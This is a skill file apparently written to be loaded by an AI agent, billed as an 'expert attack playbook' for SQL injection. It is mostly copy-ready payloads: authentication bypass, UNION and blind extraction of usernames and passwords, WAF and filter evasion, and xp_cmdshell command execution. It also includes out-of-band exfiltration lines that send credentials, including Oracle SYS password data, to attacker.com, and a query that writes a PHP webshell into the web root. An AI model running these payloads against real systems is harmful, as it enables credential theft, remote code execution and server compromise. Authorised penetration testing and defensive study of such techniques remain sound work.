---
name: sqli-sql-injection
description: >-
  SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths.
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Advanced SQLi techniques. Per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, and escalation to OS.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when backend is Java with Jackson and SQL keywords are WAF-blocked

### First-pass payload families

| Situation | Start With |
|---|---|
| Login or boolean branch | `' or 1=1--` |
| Numeric parameter | `1 or 1=1` |
| ORDER BY / sorting | `1,2,3` then `1 desc--` |
| Visible SQL errors | `'` then DBMS-specific error probes |
| No visible output | time-based payloads |
| Heavy filtering / WAF | polyglot or whitespace-free variants |

### DBMS routing hints

| Clue | Likely DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `Microsoft OLE DB Provider` | MSSQL |
| `PG::` / `PostgreSQL` | PostgreSQL |
| `ORA-` prefix | Oracle |

---

## 1. DETECTION

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |

**Test ALL parameter types** — URL query, POST body, JSON, XML, HTTP headers.

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION(), @@datadir, @@global.secure_file_priv

-- MSSQL
@@VERSION, DB_NAME(), USER_NAME()

-- Oracle
SELECT banner FROM v$version WHERE ROWNUM=1

-- PostgreSQL
version(), current_database(), current_user
```

---

## 3. UNION-BASED DATA EXTRACTION

```sql
-- Column count:
ORDER BY 1-- ... ORDER BY N-- (until error = N-1 columns)

-- Column type:
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--

-- String concat:
MySQl: CONCAT(username,0x3a,password)
MSSQL: username+'|'+password
Oracle: username||'|'||password
PostgreSQL: username||':'||password
```

---

## 4. BLIND INJECTION

```sql
-- Boolean blind:
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Time-based:
-- MSSQL: '; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--
-- MySQL: ' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--
-- PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 5. OUT-OF-BAND EXFILTRATION

```sql
-- MSSQL OpenRowSet (outbound TCP, use port 80/443):
'; INSERT INTO OPENROWSET('SQLOLEDB','DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass','SELECT * FROM foo') SELECT TOP 1 username+':'+password FROM users--

-- Oracle UTL_HTTP:
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--

-- Oracle UTL_INADDR DNS exfil:
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--

-- MySQL DNS via LOAD_FILE (Windows + UNC):
SELECT LOAD_FILE('\\\\attacker.com\\share')

-- MySQL INTO OUTFILE webshell:
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

---

## 6. OS COMMAND EXECUTION

```sql
-- MSSQL xp_cmdshell:
'; EXEC xp_cmdshell('whoami')--
-- Enable: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- Oracle Java stored procedures:
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
```

---

## 7. SECOND-ORDER INJECTION

1. Register username: `admin'--`
2. App safely inserts into DB
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips condition -> updates **admin's** password

---

## 8. PARAMETERIZED QUERY BYPASS SCENARIOS

1. Table/column names user-controlled: `"SELECT * FROM " + tableName` — can't parameterize identifiers
2. Partial parameterization — some fields concatenated
3. IN clause with dynamic count (only last param parameterized)
4. Second-order — data from DB assumed clean, re-used without params

---

## 9. FILTER EVASION

```sql
-- Comment injection:
SEL/**/ECT, UN/**/ION

-- Case variation:
UnIoN SeLeCt

-- Whitespace alternatives:
SELECT%09username%09FROM%09users  (tab)
SELECT%0ausername%0aFROM%0ausers  (newline)

-- String construction (bypass literal detection):
CHAR(117,115,101,114,110,97,109,101)  -- MySQL: 'username'
CHR(117)||CHR(115)  -- Oracle
```

---

## 10. DATABASE METADATA

```sql
-- MySQL:
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- MSSQL:
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'

-- Oracle:
SELECT owner,table_name FROM all_tables
SELECT username,password FROM dba_users

-- PostgreSQL:
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

---

## 11. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*/**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- No-comma: `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c`
- No-space: `SELECT(username)FROM(users)`
